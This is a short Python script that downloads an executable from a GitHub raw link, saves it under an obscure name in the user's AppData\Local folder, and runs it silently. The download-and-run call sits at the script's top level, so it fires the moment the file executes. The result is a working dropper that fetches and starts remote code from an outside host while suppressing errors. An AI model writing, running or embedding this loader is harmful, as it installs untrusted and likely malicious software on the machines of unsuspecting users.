import os
import requests
import time

def download_and_run_exe(url, filename="x69gg.exe"):
    appdata_local = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
    exe_path = os.path.join(appdata_local, filename)
    
    if os.path.exists(exe_path):
        try:
            os.remove(exe_path)
        except Exception:
            return
    
    response = requests.get(url)
    with open(exe_path, "wb") as f:
        f.write(response.content)
    
    time.sleep(1)
    try:
        os.startfile(exe_path)
    except Exception:
        pass
    return exe_path

download_and_run_exe("https://github.com/s7bhme/sada/raw/refs/heads/main/x69.exe")